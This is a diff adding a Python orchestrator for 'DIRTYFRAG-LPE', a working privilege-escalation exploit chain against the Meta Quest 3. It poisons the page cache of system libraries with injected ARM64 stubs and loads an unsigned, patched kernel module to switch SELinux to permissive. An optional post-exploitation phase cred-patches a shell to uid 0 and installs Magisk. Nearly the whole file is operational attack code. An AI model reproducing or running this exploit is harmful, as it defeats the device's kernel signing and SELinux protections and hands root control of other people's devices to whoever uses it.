@@ -1,0 +1,507 @@
+#!/usr/bin/env python3
+# ============================================================================================
+#  DIRTYFRAG-LPE  —  unprivileged (uid2000 shell) SELinux Enforcing->Permissive on Quest 3
+#  Single orchestrator. Firmware-specific values live in targets/<name>.json.
+#
+#  Chain (zero root):
+#    [shell] stage Dirty-Frag IpSec SA
+#    [shell] poison libeva init_array ctor -> 2-file page-cache-poison stub (in hal_tracking)
+#    [shell] poison libandroid_servers::dump -> ctl.restart stub (in system_server)
+#    [shell] dumpsys input     -> system_server restarts trackingservice
+#                                 -> libeva ctor poisons carrier .ko (enforcing=0 patch) + cfg
+#    [shell] setprop ctl.start insmod_sh
+#                                 -> init-insmod-sh finit_modules the poisoned carrier
+#                                 -> kernel loads unsigned module -> selinux_state.enforcing = 0
+#
+#  Add a new firmware: gather the carrier .ko + original init.insmod.cfg + the offsets/DELTA,
+#  drop them under targets/<name>/ and write targets/<name>.json. No code changes.
+# ============================================================================================
+import argparse, json, os, re, struct, subprocess, sys, time, threading
+from Crypto.Cipher import AES
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+TOOLS = os.environ.get("AOSP_CLANG_BIN", "/home/henry/Tools/aosp-clang/clang-r450784e/bin")
+CLANG, OBJCOPY, READELF = (os.path.join(TOOLS, x) for x in ("clang", "llvm-objcopy", "llvm-readelf"))
+DEX = os.path.join(HERE, "e2e.dex")
+BUILD = os.path.join(HERE, "build")
+
+# 52-byte carrier init patch template (relocation-free): paciasp; adr x1,anchor; ldr w2,[x1];
+# sbfx; b skip; anchor:bl<reloc>; add x1,x1,w2,sxtw#2; movz x2,#D0; movk x2,#D1,lsl16;
+# add x1,x1,x2; strb wzr,[x1]; autiasp; ret.  movz@0x1c / movk@0x20 patched from DELTA.
+PATCH_INIT = bytes.fromhex(
+    "3f2303d5" "81000010" "220040b9" "42644093"
+    "02000014" "00000094" "21c8228b" "025199d2"
+    "823da0f2" "2100028b" "3f000039" "bf2303d5"
+    "c0035fd6")
+R_AARCH64_CALL26 = 0x11b
+
+# ---- Dirty-Frag keystream (matches Stager/Writer) ----
+def keystream0_fn(keymat_base):
+    KEYMAT = bytes((keymat_base + i) & 0xff for i in range(20))
+    ecb = AES.new(KEYMAT[:16], AES.MODE_ECB); SALT = KEYMAT[16:20]
+    return lambda iv: ecb.encrypt(SALT + iv + b"\x00\x00\x00\x02")[0]
+
+# ============================== logging ==============================
+C = dict(r="\033[0m", b="\033[1m", dim="\033[2m", red="\033[31m", grn="\033[32m",
+         yel="\033[33m", blu="\033[34m", mag="\033[35m", cyn="\033[36m", gry="\033[90m")
+if not sys.stdout.isatty(): C = {k: "" for k in C}
+_t0 = time.time()
+def _ts(): return f"{C['gry']}[{time.time()-_t0:6.1f}s]{C['r']}"
+def banner(txt):
+    line = "═" * (len(txt) + 2)
+    print(f"\n{C['cyn']}{C['b']}╔{line}╗\n║ {txt} ║\n╚{line}╝{C['r']}")
+def step(txt):  print(f"{_ts()} {C['blu']}{C['b']}▸{C['r']} {C['b']}{txt}{C['r']}")
+def ok(txt):    print(f"{_ts()} {C['grn']}  ✓ {txt}{C['r']}")
+def info(txt):  print(f"{_ts()} {C['gry']}    {txt}{C['r']}")
+def warn(txt):  print(f"{_ts()} {C['yel']}  ! {txt}{C['r']}")
+def err(txt):   print(f"{_ts()} {C['red']}{C['b']}  ✗ {txt}{C['r']}")
+def win(txt):   print(f"{_ts()} {C['grn']}{C['b']}  ★ {txt}{C['r']}")
+
+# ============================== adb ==============================
+class ADB:
+    def __init__(self, serial): self.s = serial
+    def _run(self, args, **kw):
+        return subprocess.run(["adb", "-s", self.s] + args, capture_output=True, text=True, **kw)
+    def sh(self, cmd):    return self._run(["shell", cmd]).stdout.strip()
+    def su(self, cmd):    return self._run(["shell", f'su -c "{cmd}"']).stdout.strip()
+    def push(self, l, r): return self._run(["push", l, r])
+    def getprop(self, p): return self.sh(f"getprop {p}")
+    def alive(self):      return self._run(["get-state"]).stdout.strip() == "device"
+    def read_region(self, path, off, n):
+        import base64
+        out = self._run(["shell", f"dd if={path} bs=1 skip={off} count={n} 2>/dev/null | base64"]).stdout
+        return base64.b64decode(out)
+
+def pick_device(target, override):
+    r = subprocess.run(["adb", "devices"], capture_output=True, text=True).stdout
+    serials = [l.split()[0] for l in r.splitlines()[1:] if "\tdevice" in l]
+    if override:
+        if override not in serials: err(f"device {override} not connected"); sys.exit(1)
+        return override
+    want = target["device"]["build_incremental"]
+    for s in serials:
+        if ADB(s).getprop("ro.build.version.incremental") == want: return s
+    err(f"no connected device matches build {want}; use --device"); sys.exit(1)
+
+# ============================== ELF helpers ==============================
+def elf_sections(data):
+    e_shoff, = struct.unpack_from("<Q", data, 0x28)
+    shentsz, shnum, shstrndx = struct.unpack_from("<HHH", data, 0x3a)
+    secs = []
+    for i in range(shnum):
+        off = e_shoff + i * shentsz
+        name, = struct.unpack_from("<I", data, off)
+        sh_off, sh_size = struct.unpack_from("<QQ", data, off + 24)
+        secs.append([name, sh_off, sh_size])
+    strtab_off = secs[shstrndx][1]
+    named = {}
+    for name, o, s in secs:
+        end = data.index(b"\0", strtab_off + name)
+        named[data[strtab_off + name:end].decode()] = (o, s)
+    return named
+
+# ============================== builds ==============================
+def hx(v): return int(v, 16) if isinstance(v, str) else v
+
+def build_patch_init(delta):
+    p = bytearray(PATCH_INIT)
+    imm0, imm1 = delta & 0xffff, (delta >> 16) & 0xffff
+    struct.pack_into("<I", p, 0x1c, 0xD2800002 | (imm0 << 5))   # movz x2,#imm0
+    struct.pack_into("<I", p, 0x20, 0xF2A00002 | (imm1 << 5))   # movk x2,#imm1,lsl16
+    return bytes(p)
+
+def build_carrier(tgt, tdir):
+    c = tgt["carrier"]
+    ko = os.path.join(tdir, c["local_ko"])
+    data = bytearray(open(ko, "rb").read())
+    secs = elf_sections(data)
+    it_off, it_size = secs[".init.text"]
+    rela_off, rela_size = secs[".rela.init.text"]
+    assert it_size >= len(PATCH_INIT), f".init.text {it_size} < patch {len(PATCH_INIT)}"
+    anchor_off = hx(c["anchor_reloc_off"])
+    delta = hx(tgt["kernel"]["delta_selinux_from_anchor"])
+    # 1) splice patched init
+    data[it_off:it_off + len(PATCH_INIT)] = build_patch_init(delta)
+    # 2) fix relocations: repoint the CALL26 anchor, NONE the rest within the patched region
+    n = rela_size // 24; call26 = 0
+    for i in range(n):
+        e = rela_off + i * 24
+        r_off, r_info = struct.unpack_from("<QQ", data, e)
+        typ = r_info & 0xffffffff
+        if typ == R_AARCH64_CALL26:
+            struct.pack_into("<Q", data, e, anchor_off); call26 += 1
+        elif r_off < len(PATCH_INIT):
+            struct.pack_into("<Q", data, e + 8, 0)       # -> R_AARCH64_NONE
+    assert call26 == 1, f"expected exactly one CALL26 anchor, found {call26}"
+    out = os.path.join(BUILD, "carrier_patched.ko")
+    open(out, "wb").write(data)
+    return out, data
+
+def build_cfg(tgt, tdir, insmod_path=None):
+    c = tgt["cfg"]
+    orig = bytearray(open(os.path.join(tdir, c["local_cfg"]), "rb").read())
+    path = insmod_path if insmod_path else tgt["carrier"]["device_path"]
+    line = b"insmod|" + path.encode() + b"\n"
+    off = hx(c["inject_off"]); region = c["inject_len"]           # bounded region (whole cfg lines)
+    if region < len(line):
+        err(f"cfg inject_len {region} < insmod line {len(line)}B at 0x{off:x}"); sys.exit(1)
+    if off + region > len(orig) - 17:
+        warn("inject region ends within 17B of EOF (sendfile tail limit) — move inject_off earlier")
+    newblk = line + b"#" * (region - len(line) - 1) + b"\n"       # pad to region with a comment line
+    assert len(newblk) == region
+    patched = bytearray(orig); patched[off:off + region] = newblk
+    return orig, bytes(patched)
+
+def assemble(src_text, name):
+    s = os.path.join(BUILD, name + ".S"); o = os.path.join(BUILD, name + ".o"); b = os.path.join(BUILD, name + ".bin")
+    open(s, "w").write(src_text)
+    subprocess.run([CLANG, "-target", "aarch64-linux-gnu", "-c", s, "-o", o], check=True,
+                   capture_output=True)
+    subprocess.run([OBJCOPY, "-O", "binary", "--only-section=.stub", o, b], check=True)
+    raw = open(b, "rb").read()
+    syms = {}
+    for l in subprocess.run([READELF, "-s", o], capture_output=True, text=True).stdout.splitlines():
+        f = l.split()
+        if len(f) >= 8 and re.fullmatch(r"[0-9a-fA-F]{16}", f[1]) and f[6].isdigit():
+            syms[f[7]] = int(f[1], 16)   # defined local labels (section-relative offset)
+    return bytearray(raw), syms
+
+def build_libeva_stub(tgt, port, carrier_want, carrier_cur, cfg_want, cfg_cur):
+    lv = tgt["libeva"]
+    tmpl = open(os.path.join(HERE, "asm", "eva_kopoison.S.tmpl")).read()
+    src = tmpl.replace("@CARRIER_PATH@", tgt["carrier"]["device_path"]) \
+              .replace("@CFG_PATH@", tgt["cfg"]["device_path"])
+    raw, syms = assemble(src, "eva_kopoison")
+    ks0 = keystream0_fn(hx(tgt["dirtyfrag"]["keymat_base"]))
+    import random; rnd = random.Random(0xC0FFEE)
+    def ivf(need):
+        while True:
+            iv = bytes(rnd.getrandbits(8) for _ in range(8))
+            if ks0(iv) == need: return iv
+    def difftable(cur, want): return [(i, cur[i] ^ want[i]) for i in range(len(want)) if cur[i] != want[i]]
+    d0, d1 = difftable(carrier_cur, carrier_want), difftable(cfg_cur, cfg_want)
+    if len(d0) > 48:  err(f"carrier diffs {len(d0)} > table0 capacity 48"); sys.exit(1)
+    if len(d1) > 55:  err(f"cfg diffs {len(d1)} > table1 capacity 55 (reduce inject_len)"); sys.exit(1)
+    def fill(off, diffs):
+        for i, (o, need) in enumerate(diffs):
+            e = off + i * 12; raw[e:e + 4] = struct.pack("<I", o); raw[e + 4:e + 12] = ivf(need)
+    fill(syms["table0"], d0); fill(syms["table1"], d1)
+    struct.pack_into("<I", raw, syms["cnt0"], len(d0))
+    struct.pack_into("<I", raw, syms["cnt1"], len(d1))
+    gap = hx(lv["stub_gap_off"]); orig_ctor = hx(lv["orig_ctor_off"])
+    if len(raw) > lv["stub_gap_size"]:
+        err(f"stub {len(raw)}B > gap {lv['stub_gap_size']}B"); sys.exit(1)
+    imm = ((orig_ctor - (gap + syms["tailcall"])) >> 2) & 0x03ffffff
+    struct.pack_into("<I", raw, syms["tailcall"], 0x14000000 | imm)
+    struct.pack_into(">H", raw, syms["sockaddr"] + 2, port)
+    # spec: place blob at gap + redirect init_array[0] -> gap
+    ia = hx(lv["init_array_off"])
+    spec = bytearray()
+    for i, b in enumerate(raw): spec += struct.pack("<I", gap + i) + bytes([b])
+    for i, b in enumerate(struct.pack("<Q", gap)): spec += struct.pack("<I", ia + i) + bytes([b])
+    return bytes(raw), bytes(spec), len(d0), len(d1)
+
+def build_libas_stub(tgt):
+    la = tgt["libandroid_servers"]
+    sock = tgt["property_socket"].encode()
+    ctl = "ctl.restart"; svc = tgt["services"]["tracking"]
+    msg = struct.pack("<I", 0x00020001) + struct.pack("<I", len(ctl)) + ctl.encode() \
+          + struct.pack("<I", len(svc)) + svc.encode()
+    msg_bytes = "\n".join("    .byte " + ",".join(f"0x{b:02x}" for b in msg[i:i+8])
+                          for i in range(0, len(msg), 8))
+    saddrlen = 2 + len(sock) + 1
+    tmpl = open(os.path.join(HERE, "asm", "libas_restart.S.tmpl")).read()
+    src = tmpl.replace("@PROP_SOCKET@", tgt["property_socket"]) \
+              .replace("@CTL_DESC@", f"{ctl}={svc}") \
+              .replace("@SADDRLEN@", str(saddrlen)).replace("@MSGLEN@", str(len(msg))) \
+              .replace("@MSG@", msg_bytes)
+    raw, _ = assemble(src, "libas_restart")
+    dump = hx(la["dump_off"])
+    if len(raw) > hx(la["dump_size"]):
+        err(f"libas stub {len(raw)}B > dump fn {hx(la['dump_size'])}B"); sys.exit(1)
+    spec = bytearray()
+    for i, b in enumerate(raw): spec += struct.pack("<I", dump + i) + bytes([b])
+    return bytes(raw), bytes(spec)
+
+# ---- restore specs (revert the code-injection poisons, shell-only, no reboot) ----
+def libeva_restore_spec(tgt, stub_len):
+    gap = hx(tgt["libeva"]["stub_gap_off"]); ia = hx(tgt["libeva"]["init_array_off"])
+    orig = hx(tgt["libeva"]["orig_ctor_off"])
+    spec = bytearray()
+    for i in range(stub_len): spec += struct.pack("<I", gap + i) + b"\x00"       # gap -> zeros
+    for i, b in enumerate(struct.pack("<Q", orig)): spec += struct.pack("<I", ia + i) + bytes([b])  # init_array[0] -> orig ctor
+    return bytes(spec)
+
+def libas_restore_spec(tgt, orig_bytes):
+    dump = hx(tgt["libandroid_servers"]["dump_off"])
+    spec = bytearray()
+    for i, b in enumerate(orig_bytes): spec += struct.pack("<I", dump + i) + bytes([b])
+    return bytes(spec)
+
+# ============================== device ops ==============================
+def disable_phantom(adb):
+    # stop Android's phantom-process monitor from SIGKILLing our long app_process Writer loops
+    adb.sh("device_config put activity_manager max_phantom_processes 2147483647 2>/dev/null; "
+           "settings put global settings_enable_monitor_phantom_procs false 2>/dev/null; "
+           "device_config set_sync_disabled_for_tests persistent 2>/dev/null; true")
+
+def poison(adb, dev_path, spec, tag, retries=8):
+    sp = os.path.join(BUILD, tag + ".spec"); open(sp, "wb").write(spec)
+    adb.push(sp, f"/data/local/tmp/{tag}.spec")
+    total = len(spec) // 5
+    out = ""
+    for attempt in range(1, retries + 1):
+        # Writer is idempotent (skips bytes already == target) and uses a random SPI, so a
+        # phantom-killed partial run is safe to re-run; retry until all records are accounted for.
+        out = adb.sh(f"cd /data/local/tmp && CLASSPATH=e2e.dex app_process / q3.Writer {dev_path} /data/local/tmp/{tag}.spec")
+        m = re.search(r"wrote=(\d+) skipped=(\d+)", out)
+        if m and int(m.group(1)) + int(m.group(2)) == total:
+            info(f"{tag}: wrote={m.group(1)} skipped={m.group(2)}" + (f"  ({attempt} tries)" if attempt > 1 else ""))
+            return
+        if attempt < retries:
+            warn(f"{tag}: writer incomplete (attempt {attempt}/{retries}) — retrying")
+            import time as _t; _t.sleep(2)   # let a stale SA reap
+    err(f"{tag} poison failed after {retries} attempts: ...{out[-160:]}"); sys.exit(1)
+
+class Stager:
+    def __init__(self, serial): self.serial = serial; self.p = None; self.port = None
+    def start(self):
+        self.p = subprocess.Popen(["adb", "-s", self.serial, "shell",
+            "cd /data/local/tmp && CLASSPATH=e2e.dex exec app_process / q3.Stager 1800"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        for _ in range(80):
+            line = self.p.stdout.readline()
+            if not line:
+                if self.p.poll() is not None: break
+                continue
+            m = re.search(r"ENCAPPORT=(\d+)", line)
+            if m: self.port = int(m.group(1)); return self.port
+        return None
+    def stop(self):
+        if self.p and self.p.poll() is None:
+            self.p.terminate()
+            try: self.p.wait(3)
+            except Exception: self.p.kill()
+
+class WaitShell:
+    # A persistent adb shell that publishes its pid, waits for a 'go' file, then execs postex.sh.
+    # pe.ko cred-patches this pid -> it becomes uid 0 -> runs postex.sh as root.
+    def __init__(self, serial, skip_magisk):
+        self.serial = serial; self.p = None; self.pid = None; self.skip = "1" if skip_magisk else "0"
+    def start(self):
+        subprocess.run(["adb","-s",self.serial,"shell","rm -f /data/local/tmp/pepid /data/local/tmp/pego /data/local/tmp/postex_done"])
+        self.p = subprocess.Popen(["adb","-s",self.serial,"shell",
+            "echo $$ > /data/local/tmp/pepid; while [ ! -f /data/local/tmp/pego ]; do sleep 0.2; done; "
+            f"SKIP_MAGISK={self.skip} sh /data/local/tmp/postex.sh"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        for _ in range(50):
+            pid = subprocess.run(["adb","-s",self.serial,"shell","cat /data/local/tmp/pepid 2>/dev/null"],
+                                 capture_output=True, text=True).stdout.strip()
+            if pid.isdigit(): self.pid = int(pid); return self.pid
+            time.sleep(0.2)
+        return None
+    def release(self): subprocess.run(["adb","-s",self.serial,"shell","touch /data/local/tmp/pego"])
+    def stop(self):
+        if self.p and self.p.poll() is None:
+            self.p.terminate()
+            try: self.p.wait(3)
+            except Exception: self.p.kill()
+
+# ============================== phases ==============================
+def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=False):
+    tgt = json.load(open(target_path))
+    tdir = os.path.join(HERE, "targets")
+    os.makedirs(BUILD, exist_ok=True)
+    banner(f"DIRTYFRAG-LPE   target: {tgt['name']}")
+    info(tgt["description"])
+
+    serial = pick_device(tgt, device_override); adb = ADB(serial)
+    step("Preflight")
+    dev_build = adb.getprop("ro.build.version.incremental")
+    (ok if dev_build == tgt["device"]["build_incremental"] else warn)(f"device {serial}  build {dev_build}")
+    before = adb.sh("getenforce")
+    info(f"uid={adb.sh('id -u')}  getenforce={before}")
+    if before != "Enforcing": warn(f"SELinux already {before} (expected Enforcing)")
+    if not os.path.exists(DEX): err("e2e.dex missing (build Stager/Writer)"); sys.exit(1)
+    adb.push(DEX, "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex")
+    disable_phantom(adb)
+
+    banner("BUILD  (host)")
+    step("Carrier .ko  (48-byte diff-injection, enforcing=0)")
+    carrier_out, carrier_want = build_carrier(tgt, tdir)
+    carrier_cur = open(os.path.join(tdir, tgt["carrier"]["local_ko"]), "rb").read()
+    ndiff = sum(1 for i in range(len(carrier_want)) if carrier_want[i] != carrier_cur[i])
+    ok(f"carrier_patched.ko  ({ndiff} diff bytes,  anchor={tgt['kernel']['anchor_symbol']}, "
+       f"delta={tgt['kernel']['delta_selinux_from_anchor']})")
+    step("init.insmod.cfg  (+insmod line, modprobe kept)")
+    cfg_cur, cfg_want = build_cfg(tgt, tdir)
+    ok(f"cfg patched  ({sum(1 for i in range(len(cfg_want)) if cfg_want[i]!=cfg_cur[i])} diff bytes)")
+
+    banner("STAGE  (shell: Dirty-Frag SA)")
+    stager = Stager(serial)
+    step("Staging attacker-keyed AES-GCM ESP SA (spi 0xdeadbe10)")
+    port = stager.start()
+    if not port: err("stager failed (stale SA? reboot to clear xfrm)"); stager.stop(); sys.exit(1)
+    ok(f"SA live, encap port {port}  (held by background stager)")
+
+    eva_stub_len = 0; orig_las = b""
+    try:
+        banner("POISON  (shell -> page caches)")
+        step("libeva stub  (init_array[0] -> 2-file poison stub in the gap)")
+        eva_raw, eva_spec, c0, c1 = build_libeva_stub(tgt, port, carrier_want, carrier_cur, cfg_want, cfg_cur)
+        eva_stub_len = len(eva_raw)
+        info(f"stub {len(eva_raw)}B  (carrier IVs={c0}, cfg IVs={c1})  gap fits {tgt['libeva']['stub_gap_size']}B")
+        poison(adb, tgt["libeva"]["device_path"], eva_spec, "libeva")
+        step("libandroid_servers::dump stub  (-> ctl.restart trackingservice)")
+        las_raw, las_spec = build_libas_stub(tgt)
+        orig_las = adb.read_region(tgt["libandroid_servers"]["device_path"],
+                                   hx(tgt["libandroid_servers"]["dump_off"]), len(las_raw))  # save for restore
+        poison(adb, tgt["libandroid_servers"]["device_path"], las_spec, "libas")
+
+        banner("TRIGGER  (shell)")
+        tsvc = tgt["services"]["tracking"]; isvc = tgt["services"]["insmod_sh"]
+        step(f"dumpsys input  ->  system_server restarts {tsvc}  ->  ctor poisons carrier + cfg")
+        pid0 = adb.sh(f"pidof {tsvc}")
+        adb.sh("dumpsys input >/dev/null 2>&1")
+        pid1 = pid0
+        for _ in range(20):
+            time.sleep(1); pid1 = adb.sh(f"pidof {tsvc}")
+            if pid1 and pid1 != pid0: break
+        if pid1 == pid0 or not pid1:
+            err(f"{tsvc} did not restart (pid still {pid0}) — dump stub not hit"); return
+        ok(f"{tsvc} restarted  pid {pid0} -> {pid1}")
+        # settle: the init_array ctor runs at process init and poisons carrier+cfg via the SA;
+        # wait it out before finit (re-triggering would REVERT the poison, so no retry).
+        info(f"settling {settle}s for the ctor's carrier/cfg poison to complete")
+        time.sleep(settle)
+        if verify_root:
+            csha = adb.su(f"sha1sum {tgt['carrier']['device_path']}").split()[0]
+            info(f"carrier page-cache sha (root check): {csha[:12]}…")
+        if adb.sh(f"lsmod | grep -c llcc_perfmon") != "0":
+            warn("carrier already loaded before finit — original may have raced in; reboot & retry")
+        step(f"setprop ctl.start {isvc}  ->  init finit_modules the poisoned carrier")
+        adb.sh(f"setprop ctl.start {isvc}"); time.sleep(4)
+
+        banner("VERIFY")
+        after = adb.sh("getenforce")
+        if after == "Permissive":
+            win(f"SELinux {before} -> {after}   (from uid={adb.sh('id -u')} shell, zero root)")
+            if verify_root:
+                info("module: " + (adb.su("lsmod | grep llcc_perfmon") or "(not listed)"))
+        else:
+            err(f"getenforce={after} (expected Permissive) — chain did not complete")
+    finally:
+        stager.stop(); ok("stager stopped (SA reaped)")
+
+    if cleanup == "reboot":
+        banner("RESTORE  (reboot)")
+        step("setenforce 1; rmmod; reboot (clears all page-cache poison + xfrm)")
+        adb.su("setenforce 1; rmmod llcc_perfmon")
+        subprocess.run(["adb", "-s", serial, "reboot"])
+        subprocess.run(["adb", "-s", serial, "wait-for-device"])
+        for _ in range(40):
+            if adb.getprop("sys.boot_completed") == "1": break
+            time.sleep(3)
+        ge = adb.sh("getenforce")
+        (ok if ge == "Enforcing" else warn)(f"post-reboot getenforce={ge}")
+
+    elif cleanup == "leave-disabled":
+        banner("CLEANUP  (leave SELinux disabled, no reboot)")
+        step("Revert the code-injection poisons via shell (no root, no reboot)")
+        poison(adb, tgt["libeva"]["device_path"], libeva_restore_spec(tgt, eva_stub_len), "libeva_restore")
+        info("libeva: init_array[0] -> orig ctor, stub gap zeroed (future tracking restarts are clean)")
+        if orig_las:
+            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
+            info("libandroid_servers::dump restored (dumpsys input no longer restarts trackingservice)")
+        ge = adb.sh("getenforce")
+        (win if ge == "Permissive" else warn)(f"getenforce={ge}  — code poisons reverted, NO reboot")
+        warn("residue (benign, needs root/reboot): carrier/cfg page-cache poison + loaded llcc_perfmon")
+        info("READY FOR POST-EX: run  orchestrate.py --postex  (usbip-vudc cred-patch -> Singularity Magisk)")
+        info("  drop_caches (evict carrier/cfg) + rmmod llcc_perfmon + setenforce 1 (re-enable, magisk policy live)")
+    elif cleanup == "postex":
+        banner("POST-EX  (root via insmod_sh -> Magisk)")
+        if adb.sh("getenforce") != "Permissive":
+            err("not permissive — base chain failed; aborting post-ex"); return
+        k = tgt["kernel"]; ppath = "/data/local/tmp/uv.ko"
+        # 0) revert the code-injection poisons (libeva ctor + libandroid dump) so trackingservice /
+        #    system_server are clean before Magisk restarts zygote
+        step("Reverting code-injection poisons (libeva/libandroid) via shell")
+        poison(adb, tgt["libeva"]["device_path"], libeva_restore_spec(tgt, eva_stub_len), "libeva_restore")
+        if orig_las:
+            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
+        # 1) waiting shell to be cred-patched
+        step("Launching waiting shell (to be cred-patched to uid 0)")
+        wsh = WaitShell(serial, skip_magisk); pid = wsh.start()
+        if not pid: err("waiting shell failed"); return
+        ok(f"waiting shell pid {pid}")
+        # 2) build the diff-patched cred carrier (usbip-vudc) for this pid + push to shell-writable dir
+        step("Diff-patching cred carrier (usbip-vudc: enforcing=0 + cred-patch, anchor-relative)")
+        credko = os.path.join(BUILD, "uv.ko")
+        cc = os.path.join(tdir, tgt["cred_carrier"]["local_ko"])
+        r = subprocess.run([sys.executable, os.path.join(HERE, "build_credmod.py"), cc, credko,
+                            k["delta_selinux_from_anchor"], k["delta_findvpid_from_anchor"],
+                            k["delta_pidtask_from_anchor"], str(pid), k["delta_ssuse_from_anchor"]],
+                           capture_output=True, text=True)
+        if r.returncode: err("build_credmod failed: " + r.stderr + r.stdout); wsh.stop(); return
+        info(r.stdout.strip().split(": ",1)[-1])
+        adb.push(credko, ppath)
+        # 3) stage post-ex assets (root shell will run these)
+        step("Staging post-ex assets (postex.sh, singularity_magisk.sh, singularity-Magisk.apk)")
+        A = os.path.join(HERE, "postex", "assets")
+        adb.push(os.path.join(HERE, "postex", "postex.sh"), "/data/local/tmp/postex.sh")
+        for f in ("singularity_magisk.sh", "singularity-Magisk.apk"):
+            adb.push(os.path.join(A, f), "/data/local/tmp/" + f)
+        # 4) shell poisons cfg -> insmod uv.ko  (permissive: shell reads vendor cfg by DAC)
+        step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)")
+        _, cfg_want = build_cfg(tgt, tdir, insmod_path=ppath)
+        off = hx(tgt["cfg"]["inject_off"]); ln = tgt["cfg"]["inject_len"]
+        spec = bytearray()
+        for i in range(off, off + ln): spec += struct.pack("<I", i) + bytes([cfg_want[i]])
+        poison(adb, tgt["cfg"]["device_path"], bytes(spec), "cfg_pe")
+        # 5) trigger: insmod_sh loads uv.ko -> cred-patches the waiting shell to root
+        step("ctl.start insmod_sh -> loads uv.ko -> cred-patch waiting shell to uid 0")
+        adb.sh("setprop ctl.start insmod_sh")
+        rooted = False; uline = ""
+        for _ in range(20):   # poll until the waiting shell's creds are actually patched
+            time.sleep(1)
+            uline = adb.sh(f"grep -m1 Uid /proc/{wsh.pid}/status 2>/dev/null")
+            if uline.split()[1:2] == ["0"]: rooted = True; break
+        if not rooted:
+            err(f"waiting shell not rooted (uv.ko load failed?) — {uline or 'no Uid line'}"); wsh.stop(); return
+        ok(f"waiting shell {wsh.pid} cred-patched -> uid 0")
+        # 6) release the (now-root) waiting shell -> runs postex.sh
+        step("Releasing rooted shell -> postex.sh (drop_caches, rmmod, Magisk, setenforce 1)")
+        wsh.release()
+        for _ in range(90):   # Singularity Magisk setup (no zygote restart)
+            if adb.sh("[ -f /data/local/tmp/postex_done ] && echo y") == "y": break
+            time.sleep(2)
+        wsh.stop()
+        banner("POST-EX RESULT")
+        print(adb.sh("cat /data/local/tmp/postex.log 2>/dev/null") or "(no log)")
+        ge = adb.sh("getenforce")
+        (win if ge == "Enforcing" else warn)(f"final getenforce={ge}  (Magisk policy live if Enforcing)")
+    else:
+        warn("--no-restore: device left fully poisoned & permissive")
+
+def main():
+    ap = argparse.ArgumentParser(description="DirtyFrag LPE orchestrator (Quest 3)")
+    ap.add_argument("-t", "--target", required=True, help="targets/<name>.json")
+    ap.add_argument("-d", "--device", help="adb serial (default: match target build)")
+    g = ap.add_mutually_exclusive_group()
+    g.add_argument("--no-restore", action="store_true", help="leave device fully poisoned & permissive")
+    g.add_argument("--leave-disabled", action="store_true",
+                   help="revert code-injection poisons (shell, no reboot) but keep SELinux Permissive — for post-ex")
+    g.add_argument("--postex", action="store_true",
+                   help="after Permissive: root via insmod_sh(usbip-vudc cred-patch) -> Singularity Magisk -> setenforce 1")
+    ap.add_argument("--skip-magisk", action="store_true", help="post-ex without the Magisk step (root + rmmod + setenforce only)")
+    ap.add_argument("--verify-root", action="store_true", help="use su to confirm poison/module (validation only)")
+    ap.add_argument("--settle", type=int, default=8, help="seconds to let the ctor finish poisoning after restart (default 8)")
+    a = ap.parse_args()
+    cleanup = ("postex" if a.postex else "leave-disabled" if a.leave_disabled else "none" if a.no_restore else "reboot")
+    try:
+        run(a.target, a.device, cleanup, a.verify_root, a.settle, a.skip_magisk)
+    except KeyboardInterrupt:
+        err("interrupted")
+
+if __name__ == "__main__":
+    main()
